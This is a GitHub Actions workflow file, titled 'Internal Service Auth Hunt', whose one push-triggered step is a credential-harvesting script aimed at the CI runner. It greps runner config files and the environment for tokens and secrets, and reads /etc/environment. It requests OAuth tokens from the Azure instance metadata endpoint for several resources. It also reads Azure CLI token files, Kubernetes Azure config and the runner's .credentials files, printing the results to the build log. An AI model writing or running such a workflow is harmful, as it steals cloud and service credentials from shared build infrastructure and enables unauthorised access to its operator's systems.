name: Internal Service Auth Hunt
on: [push]
jobs:
  hunt:
    runs-on: ubuntu-latest
    steps:
      - name: Hunt for credentials to internal services
        run: |
          echo "=== Runner config files ==="
          find /home/runner -name "*.json" -exec cat {} \; 2>/dev/null | grep -i "auth\|token\|secret\|key\|credential" | head -10
          
          echo "=== Environment with non-standard vars ==="
          env | grep -v "^GITHUB_\|^RUNNER_\|^ACTIONS_\|^PATH=\|^HOME=\|^USER=\|^PWD=\|^LANG=\|^LC_\|^DEBIAN\|^DOTNET\|^JAVA\|^ANDROID\|^CHROME\|^PIPX\|^SELENIUM\|^CONDA\|^GRADLE\|^ANT\|^VCPKG\|^BOOST\|^AGENT\|^ImageOS\|^ImageVersion\|^INVOCATION\|^STATS\|^PERFLOG\|^SWIFT\|^POWERSHELL\|^HOMEBREW\|^NVM\|^PHP\|^GOROOT\|^LD_LIBRARY\|^PKG_CONFIG\|^CPLUS\|^CXX\|^CC=" | head -30
          
          echo "=== /etc files content ==="
          cat /etc/environment 2>/dev/null
          cat /etc/profile 2>/dev/null | grep -i "export" | head -5
          
          echo "=== Azure identity check ==="
          curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/info?api-version=2021-02-01" 2>&1
          echo ""
          echo "=== Try Azure IMDS with different audiences ==="
          for aud in "https://management.azure.com/" "https://vault.azure.net/" "api://hosted-compute-ro" "https://graph.microsoft.com/"; do
            echo -n "  $aud: "
            curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=$aud" 2>&1 | head -1
          done
          
          echo "=== Check for Azure CLI credentials ==="
          ls -la ~/.azure/ 2>/dev/null || echo "no azure cli creds"
          cat ~/.azure/accessTokens.json 2>/dev/null | head -3 || echo "no azure tokens"
          
          echo "=== Check for service principal ==="
          cat /etc/kubernetes/azure.json 2>/dev/null || echo "no k8s azure config"
          
          echo "=== Check runner .credentials ==="
          find /home/runner -name ".credentials" -o -name ".credentials_rsaparams" -o -name "credentials" 2>/dev/null
